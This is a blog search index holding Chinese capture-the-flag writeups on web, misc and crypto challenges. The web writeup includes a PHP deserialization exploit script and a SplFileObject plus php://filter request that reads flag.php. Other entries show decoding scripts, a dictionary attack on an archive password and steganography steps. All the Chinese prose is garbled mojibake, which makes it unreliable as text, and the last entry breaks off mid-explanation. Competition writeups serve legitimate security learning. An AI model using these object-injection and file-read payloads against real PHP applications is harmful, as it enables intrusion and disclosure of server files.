<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>[GDOUCTF 2023]åæ–¹å‘çš„é’Ÿ</title>
    <url>/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
    <content><![CDATA[<h1 id="GDOUCTF-2023-åæ–¹å‘çš„é’Ÿ"><a href="#GDOUCTF-2023-åæ–¹å‘çš„é’Ÿ" class="headerlink" title="[GDOUCTF 2023]åæ–¹å‘çš„é’Ÿ"></a>[GDOUCTF 2023]åæ–¹å‘çš„é’Ÿ</h1><h2 id="ååºåˆ—åŒ–-åŸç”Ÿç±»çš„åˆ©ç”¨"><a href="#ååºåˆ—åŒ–-åŸç”Ÿç±»çš„åˆ©ç”¨" class="headerlink" title="ååºåˆ—åŒ– + åŸç”Ÿç±»çš„åˆ©ç”¨"></a>ååºåˆ—åŒ– + åŸç”Ÿç±»çš„åˆ©ç”¨</h2><p>é¢˜ç›®é“¾æ¥<a href="https://www.nssctf.cn/problem/3723">https://www.nssctf.cn/problem/3723</a></p>
<span id="more"></span>
<p>æ‹¿åˆ°é¢˜ç›®ï¼Œå…ˆä»£ç å®¡è®¡</p>
<p><img src="/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png" alt="å›¾ç‰‡1">â€‹</p>
<p>çœ‹äº†ä¸€ä¸‹æ˜¯ååºåˆ—åŒ–æ”»å‡»</p>
<p>ç›´æ¥åˆ†æä»£ç ï¼Œæ»¡è¶³</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>è¯­å¥</p>
<p>æ‰§è¡ŒåŸç”Ÿç±»ï¼Œç„¶ååˆ©ç”¨wakeupè§¦å‘å‡½æ•°ï¼Œåˆ°è¿™é‡Œæ‰§è¡Œï¼Œç›´æ¥è´´exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>=<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;name=<span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;rank=<span class="string">&#x27;department&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;leader = <span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>= <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>-&gt;department = <span class="variable">$p2</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p3</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åä¼ å…¥åŸç”Ÿç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå·²ç»ç»™å‡ºflagä½ç½®ï¼ŒSplFileObjectåªèƒ½è¯»å–å•è¡Œï¼Œæ‰€ä»¥ç”¨ä¼ªåè®®è¯»å–å…¨æ–‡ï¼Œè§£å¯†æ‹¿åˆ°flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHANCiRmbGFnID0gIk5TU0NURnszMjVjODZhNS01M2VjLTRkMzctYTU4OC02MWRiOTVjYzg1NGR9IjsNCj8+DQo=</span><br></pre></td></tr></table></figure>

<p>$flag &#x3D; â€œNSSCTF{325c86a5-53ec-4d37-a588-61db95cc854d}â€;</p>
]]></content>
      <categories>
        <category>æ—¥å¸¸writeup</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>2024å®‰å¾½çœåˆ†å¸ƒå¼</title>
    <url>/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="2024å®‰å¾½çœåˆ†å¸ƒå¼"><a href="#2024å®‰å¾½çœåˆ†å¸ƒå¼" class="headerlink" title="2024å®‰å¾½çœåˆ†å¸ƒå¼"></a>2024å®‰å¾½çœåˆ†å¸ƒå¼</h1><h2 id="Misc-2-4"><a href="#Misc-2-4" class="headerlink" title="Misc (2&#x2F;4)"></a>Misc (2&#x2F;4)</h2><h3 id="Jack"><a href="#Jack" class="headerlink" title="Jack"></a>Jack</h3><p>æ‹¿åˆ°å‹ç¼©åŒ…ï¼Œå…ˆè§£å‹æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æœ‰434ä¸ªæ–‡ä»¶ï¼Œçœ‹ä¸€çœ¼æ–‡ä»¶</p>
<p><img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/1.png" alt="å›¾ç‰‡1"></p>
<span id="more"></span>
<p>æ˜¯ä¸ªå°ä½œæ–‡ï¼Œé‡Œé¢æ··æ‚ç€ä¸€ä¸²base64ç¼–ç ï¼Œè€ƒè™‘è§£å¯†base64ç¼–ç ï¼Œå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶å°±æ˜¯flagï¼Œé‡å‘½åæ‰€æœ‰æ–‡ä»¶ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬ï¼Œéå†æ–‡ä»¶ï¼Œå¹¶æå–base64ç¼–ç è§£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        encoded_data = f.read()</span><br><span class="line">        decoded_data = base64.b64decode(encoded_data)</span><br><span class="line">        <span class="keyword">return</span> decoded_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_files_in_folder</span>(<span class="params">folder_path</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(folder_path):</span><br><span class="line">        file_path = os.path.join(folder_path, filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                decoded_text = decode_base64(file_path)</span><br><span class="line">                <span class="built_in">print</span>(decoded_text)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error decoding <span class="subst">&#123;filename&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›¿æ¢ä¸ºä½ è¦éå†çš„æ–‡ä»¶å¤¹è·¯å¾„</span></span><br><span class="line">folder_path = <span class="string">r&#x27;C:\Users\xtyy\Desktop\CTF\Jack\Jack&#x27;</span></span><br><span class="line">process_files_in_folder(folder_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¬¬227ä¸ªæ–‡ä»¶è§£ç å¤±è´¥äº†ï¼Œå¹¶ä¸”å…¶ä»–æ–‡ä»¶æ²¡æœ‰å‡ºflagï¼Œè€ƒè™‘æ¯”è¾ƒç‰¹æ®Šçš„ç¼–ç ï¼Œè¿›å»çœ‹çœ‹ <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/2.png" alt="å›¾ç‰‡2"></p>
<p>â€‹       éšæ³¢é€æµä¸€é”®è§£ç ï¼Œæ‹¿åˆ°flagï¼Œå¯ä»¥ç®—æ˜¯éé¢„æœŸå§</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/3.png" alt="3"></p>
<h3 id="paint"><a href="#paint" class="headerlink" title="paint"></a>paint</h3><p>æ‹¿åˆ°å›¾ç‰‡ï¼Œæç¤ºæ˜¯ç”»å›¾ï¼Œ010æ‰«ä¸€çœ¼æ–‡ä»¶æœ«å°¾ï¼Œå†—ä½™è¾ƒå¤§ï¼Œå¤åˆ¶ä¸‹æ¥ï¼Œç²˜è´´åˆ°æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œåƒæ˜¯16è¿›åˆ¶ç¼–ç ï¼Œèµ›åšå¤§å¨è§£å¯†ä¸€ä¸‹</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/4.png" alt="4"></p>
<p>è‡ªåŠ¨è¯†åˆ« </p>
<p>è§£å‡ºæ¥åƒæ˜¯(x,y)åæ ‡</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/5.png" alt="5"></p>
<p>éšæ³¢é€æµæ–‡ä»¶æ“ä½œï¼Œä¸€æŠŠæ¢­ï¼Œç”ŸæˆäºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/6.png" alt="6"></p>
<h2 id="Crypto-3-4"><a href="#Crypto-3-4" class="headerlink" title="Crypto (3&#x2F;4)"></a>Crypto (3&#x2F;4)</h2><h3 id="enemy-command"><a href="#enemy-command" class="headerlink" title="enemy_command"></a>enemy_command</h3><p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/7.png" alt="7"></p>
<p>çœ‹ä¸€çœ¼ä¸‰ä¸ªå€¼46 45 32çŒœæµ‹æ‘©æ–¯å¯†ç ï¼Œå†™ä¸ªç®€å•çš„è„šæœ¬46è½¬0ï¼Œ45è½¬1ï¼Œ32è½¬ç©ºæ ¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">text=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">45 45 45 45 45 32 45 46 46 45 32 45 45 46 46 46 32 46 46 46 45 45 32 45 45 46 46 46 32 45 45 45 45 46 32 45 46 46 46 46 32 46 32 45 45 46 46 46 32 46 46 46 46 45 32 45 45 46 46 46 32 45 46 46 46 32 45 46 46 46 46 32 46 45 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 32 46 46 46 46 45 32 46 32 46 46 46 46 46 32 45 46 46 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 46 32 45 45 46 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 46 32 46 46 46 45 45 32 45 45 45 45 45 32 46 46 46 46 45 32 46 46 45 45 45 32 45 46 46 46 46 32 46 46 46 45 45 32 45 46 46 46 46 32 46 45 45 45 45 32 45 45 46 46 46 32 45 46 46</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> text:</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot; &quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;6&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;0&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;5&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&quot;3&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœï¼š</p>
<p>11111 1001 11000 00011 11000 11110 10000 0 11000 00001 11000 1000 10000 01 00001 11100 00001 11100 00011 00011 10000 1000 00001 0 00000 10000 00001 100 00001 100 00000 11000 00011 00011 10000 10000 00011 11111 00001 00111 10000 00011 10000 01111 11000 100</p>
<p>æ‘©æ–¯å¯†ç è§£å¯†ï¼š</p>
<p>0X73796E747B6A4848336B4E564D4D573366304263617D</p>
<p>0xå¼€å¤´åº”è¯¥æ˜¯16è¿›åˆ¶</p>
<p>16è¿›åˆ¶è§£ç ï¼š</p>
<p>synt{jHH3kNVMMW3f0Bca}</p>
<p>æœ‰flagé›å½¢äº†ï¼Œè€ƒè™‘æ˜¯å‡¯æ’’å¯†ç ï¼Œéšæ³¢é€æµçˆ†ç ´ï¼š</p>
<p> <img src="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/9.png" alt="9"></p>
<p>æ‹¿åˆ°flag</p>
]]></content>
      <categories>
        <category>å®‰å¾½çœèµ›writeup</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>SICTF 2024</title>
    <url>/2024/11/06/SICTF-2024-round4/</url>
    <content><![CDATA[<h1 id="SICTF-2024-Round-4"><a href="#SICTF-2024-Round-4" class="headerlink" title="SICTF 2024 #Round 4"></a><strong>SICTF 2024 #Round 4</strong></h1><p><img src="/2024/11/06/SICTF-2024-round4/1.jpg" alt="å›¾ç‰‡"></p>
<span id="more"></span>

<h2 id="Misc-5-5"><a href="#Misc-5-5" class="headerlink" title="Misc(5&#x2F;5)"></a><strong>Misc(5&#x2F;5)</strong></h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°!"></a><strong>ç­¾åˆ°!</strong></h3><p>ä¸å¿…å¤šè¨€ï¼Œç›´æ¥å…³æ³¨å…¬ä¼—å·ï¼Œå‘é€SICTF Round4å³å¯</p>
<h3 id="æ´¾æ£®"><a href="#æ´¾æ£®" class="headerlink" title="æ´¾æ£®"></a><strong>æ´¾æ£®</strong></h3><p>æŒ‰ç…§è°éŸ³å†™å‡ºåŠ å¯†è„šæœ¬ï¼Œå…¶å®è¿™é‡Œç”¨è¯­éŸ³è¯†åˆ«åº”è¯¥ä¹Ÿå¯ä»¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> xor</span><br><span class="line"><span class="comment">#from æå…‹æœ‰ç¬¬çˆ±æ…• import *</span></span><br><span class="line">answer=[<span class="number">16</span>, <span class="number">29</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">30</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">113</span>, <span class="number">125</span>]</span><br><span class="line">flag=<span class="comment">#&quot;SICTF&#123;&quot;+a+&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">ink = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">4</span>):</span><br><span class="line">       ink.append(xor(<span class="built_in">ord</span>(flag[i]),<span class="built_in">ord</span>(flag[i+<span class="number">2</span>])))</span><br><span class="line">       ink.append(xor(<span class="built_in">ord</span>(flag[i+<span class="number">1</span>]),<span class="built_in">ord</span>(flag[i+<span class="number">3</span>])))</span><br><span class="line">       ink.append(<span class="built_in">ord</span>(flag[i+<span class="number">2</span>]))</span><br><span class="line">       ink.append(<span class="built_in">ord</span>(flag[i+<span class="number">3</span>]))</span><br><span class="line"><span class="built_in">print</span>(ink)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æ„Ÿè§‰ç¬¬äºŒä¸ªimportæ²¡ç”¨åˆ°ï¼Œä¸ç®¡ä»–ï¼Œç›´æ¥é€†å‘å†™å‡ºè§£å¯†è„šæœ¬ï¼Œæ‹¿åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">ink = [<span class="number">16</span>, <span class="number">29</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">48</span>, <span class="number">30</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">69</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">74</span>, <span class="number">45</span>, <span class="number">121</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">113</span>, <span class="number">125</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ink), <span class="number">4</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor(ink[i], ink[i+<span class="number">2</span>]))</span><br><span class="line">    flag += <span class="built_in">chr</span>(xor(ink[i+<span class="number">1</span>], ink[i+<span class="number">3</span>]))</span><br><span class="line">    flag += <span class="built_in">chr</span>(ink[i+<span class="number">2</span>])</span><br><span class="line">    flag += <span class="built_in">chr</span>(ink[i+<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="æ¨¡å‹çš„ç§˜å¯†"><a href="#æ¨¡å‹çš„ç§˜å¯†" class="headerlink" title="æ¨¡å‹çš„ç§˜å¯†"></a><strong>æ¨¡å‹çš„ç§˜å¯†</strong></h3><p>æ‹¿åˆ°å‹ç¼©åŒ…ï¼Œç»™äº†å¤§å­—å…¸ï¼Œç›´æ¥å­—å…¸çˆ†ç ´å‡ºå¯†ç </p>
<p>Advanced Archive Password Recovery ç»Ÿè®¡ä¿¡æ¯:</p>
<p>æ€»è®¡å£ä»¤: 116</p>
<p>æ€»è®¡æ—¶é—´: 24ms </p>
<p>å¹³å‡é€Ÿåº¦(å£ä»¤&#x2F;ç§’): 4,833</p>
<p>è¿™ä¸ªæ–‡ä»¶çš„å£ä»¤ : haldaemon</p>
<p>åå…­è¿›åˆ¶å£ä»¤: 68 61 6c 64 61 65 6d 6f 6e </p>
<p>æ‰“å¼€æ–‡ä»¶å¤¹ï¼Œæ˜¯ä¸€ä¸ªblenderå»ºæ¨¡æ–‡ä»¶ï¼Œä¿®å¤æ–‡ä»¶å¤´</p>
<p>å¦‚æœä¸çŸ¥é“æ–‡ä»¶å¤´æ˜¯ä»€ä¹ˆï¼Œè€Œä¸”ç½‘ä¸Šä¹ŸæŸ¥ä¸åˆ°çš„è¯ï¼Œå®Œå…¨å¯ä»¥æ–°å»ºä¸€ä¸ªåŒç±»å‹æ–‡ä»¶æŸ¥çœ‹</p>
<p><img src="/2024/11/06/SICTF-2024-round4/2.jpg" alt="img"></p>
<p><img src="/2024/11/06/SICTF-2024-round4/3.jpg" alt="img"></p>
<p>ç”¨blender4.2æ‰“å¼€ï¼Œå¾—åˆ°flag</p>
<p>ç”¨å…¶ä»–ç‰ˆæœ¬çš„blenderæ‰“å¼€æ˜¯æ­£æ–¹ä½“ï¼Œåœ¨è¿™é‡Œå¡äº†åŠå¤©</p>
<h3 id="Picture"><a href="#Picture" class="headerlink" title="Picture"></a><strong>Picture</strong></h3><p>æ‰“å¼€æ–‡ä»¶å¤¹ï¼Œä¿©ä¸ªå›¾ç‰‡å’Œä¸€ä¸ªpythonè„šæœ¬ï¼Œåº”è¯¥æ˜¯è‡ªå®šä¹‰åŠ å¯†</p>
<p>ä»£ç å®¡è®¡ä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">flag = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width, height = flag.size</span><br><span class="line">image1 = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">image2 = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        r,g,b = flag.getpixel((i,j))</span><br><span class="line">        tr, tg, tb = randint(<span class="number">0</span>, <span class="number">254</span>), randint(<span class="number">0</span>, <span class="number">254</span>), randint(<span class="number">0</span>, <span class="number">254</span>)</span><br><span class="line">        image1.putpixel((i,j),(tr,tg,tb))</span><br><span class="line">        image2.putpixel((i,j),(r-tr,g-tg,b-tb))</span><br><span class="line">image1.save(<span class="string">&#x27;flag1.png&#x27;</span>)</span><br><span class="line">image2.save(<span class="string">&#x27;flag2.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç®€å•çš„å¼‚æˆ–åŠ å¯†è„šæœ¬ï¼Œç›´æ¥é€†å‘è„šæœ¬ï¼Œæ‹¿åˆ°flag.png</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag1 = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag1.png&#x27;</span>)</span><br><span class="line">flag2 = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag2.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">width, height = flag1.size</span><br><span class="line">image = Image.new(mode=<span class="string">&quot;RGB&quot;</span>, size=flag1.size, color=<span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        tr1,tg1,tb1 = flag1.getpixel((i,j))</span><br><span class="line">        tr2,tg2,tb2 = flag2.getpixel((i,j))</span><br><span class="line">        image.putpixel((i,j),(tr1+tr2,tg1+tg2,tb1+tb2))</span><br><span class="line"></span><br><span class="line">image.save(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç©ºç™½å›¾ç‰‡ï¼ŒstegsolveæŸ¥çœ‹</p>
<p>æ‹¿åˆ° flag<img src="/2024/11/06/SICTF-2024-round4/4.jpg" alt="img"></p>
<h3 id="å¤–æ˜Ÿä¿¡å·-Ultra"><a href="#å¤–æ˜Ÿä¿¡å·-Ultra" class="headerlink" title="å¤–æ˜Ÿä¿¡å· Ultra"></a><strong>å¤–æ˜Ÿä¿¡å· Ultra</strong></h3><p>å›¾ç‰‡æœ«å°¾æç¤ºï¼š</p>
<p>ç¿»è¯‘ä¸€ä¸‹æ˜¯ç”¨è‹¹æœè®¾å¤‡æŸ¥çœ‹å›¾ç‰‡æ˜¾ç¤ºä¸åŒï¼Œåº”è¯¥æ˜¯iDot pngéšå†™</p>
<p> Apple çš„ PNG è§£ç å™¨æœ‰ä¸€ä¸ªç§æœ‰çš„åŠŸèƒ½ï¼šé€šè¿‡ <a href="https://link.zhihu.com/?target=https://www.hackerfactor.com/blog/index.php?/archives/895-Connecting-the-iDOTs.html">iDOT </a>è¿›è¡Œå¹¶è¡Œè§£ç ï¼Œè€Œå…¶å­˜åœ¨ä¸€ä¸ª BUG æˆ–è€…è¯´è®¾è®¡ä¸ä¸¥è°¨çš„åœ°æ–¹</p>
<p>è¿™åŸæœ¬æ˜¯ Apple ä¸ºäº† PNG è§£ç é€Ÿåº¦è€Œåšçš„ä¸€ä¸ªä¼˜åŒ– ã€‚æŒ‰ç…§ <a href="https://link.zhihu.com/?target=https://www.w3.org/TR/PNG/%2311Chunks">PNG è§„èŒƒ</a> ï¼ŒPNG å›¾ç‰‡åˆ†ä¸ºå¤šä¸ªæ•°æ®å—ï¼Œå›¾ç‰‡å†…å®¹çš„åƒç´ æµä¼šä½¿ç”¨ <code>zlib.deflate</code> ç®—æ³•å‹ç¼©åå­˜å‚¨åœ¨ IDAT å—ä¸­ã€‚æŒ‰ç…§æ ‡å‡†å¯ä»¥æŠŠæ‰€æœ‰æ•°æ®å­˜å‚¨åœ¨ä¸€ä¸ªå¤§çš„ IDAT å—ä¸­ï¼Œä¹Ÿå¯ä»¥åˆ†å‰²å­˜å‚¨åœ¨å¤šä¸ª IDAT å—ä¸­ï¼Œè¿™åŸæœ¬æ˜¯ä¸ºäº†ç¼–ç è§£ç æ—¶å¯æ§å†…å­˜å ç”¨é‡è€Œè®¾è®¡çš„ï¼Œè€Œæ²¡æœ‰è€ƒè™‘åˆ°å¹¶è¡Œè§£ç ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å¯¹æ¯ä¸€ä¸ª IDAT å—è§£å‹å‰å¹¶ä¸ä¼šçŸ¥é“åˆ°å…¶ä¸­åŒ…å«äº†å¤šå°‘åƒç´  ã€‚</p>
